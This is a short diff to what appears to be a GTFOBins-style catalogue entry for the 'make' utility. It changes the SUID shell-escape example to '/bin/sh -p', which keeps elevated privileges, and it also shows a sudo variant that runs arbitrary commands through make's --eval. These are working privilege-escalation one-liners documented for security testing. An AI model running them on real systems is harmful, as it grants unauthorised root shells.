@@ -24,7 +24,7 @@ functions:
         sudo make -s --eval=$'x:\n\t-'"$COMMAND"
   suid-enabled:
     - code: |
-        COMMAND='/bin/sh'
+        COMMAND='/bin/sh -p'
         ./make -s --eval=$'x:\n\t-'"$COMMAND"
   file-write:
     - code: |
